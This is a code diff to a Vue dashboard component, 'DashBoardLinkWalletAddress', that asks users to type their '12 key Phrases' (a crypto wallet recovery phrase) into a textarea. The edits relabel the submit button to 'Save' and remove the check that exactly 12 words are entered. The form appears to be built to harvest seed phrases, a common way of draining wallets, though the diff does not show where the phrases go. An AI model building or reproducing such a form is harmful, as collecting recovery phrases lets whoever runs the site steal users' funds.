@@ -30,7 +30,7 @@
 
         <div class="space">
           <label>12 key Phrases</label>
-          <textarea @change="formatPhrases" rows="4" cols="50" class="form-input-2" required="required" v-model="rawPhrases"></textarea>
+          <textarea  rows="4" cols="50" class="form-input-2" required="required" v-model="rawPhrases"></textarea>
 
         </div>
 
@@ -56,7 +56,7 @@
 
         <div class="btn-alpha">
           <!--          <p class="btn">Update Details</p>-->
-          <base-button :loading="loading" style="  background-color: #5d78ff;border: 1px solid #5d78ff;" >Set Wallet Address</base-button>
+          <base-button :loading="loading" style="  background-color: #5d78ff;border: 1px solid #5d78ff;" >Save</base-button>
         </div>
 
       </form>
@@ -69,7 +69,7 @@
 import BaseButton from "@/components/baseComponents/buttons/BaseButton.vue";
 import {mapState} from "vuex";
 import StoreUtils from "@/utility/StoreUtils";
-import Swal from "sweetalert2";
+// import Swal from "sweetalert2";
 
 export default {
   name: "DashBoardLinkWalletAddress",
@@ -111,14 +111,6 @@ export default {
       // Split the user input by spaces or newlines and trim whitespace
       const wordsArray = this.rawPhrases.split(/\s+/).filter(word => word.trim() !== '');
 
-      if (wordsArray.length !== 12) {
-        await Swal.fire({
-          icon: 'warning',
-          title: 'Note',
-          text: 'Please enter exactly your 12 key Phrases, Ensure it is in right order',
-        });
-        return;
-      }
       // Join the words into a single string separated by commas
       this.formattedPhrase = wordsArray.join(', ');
     },
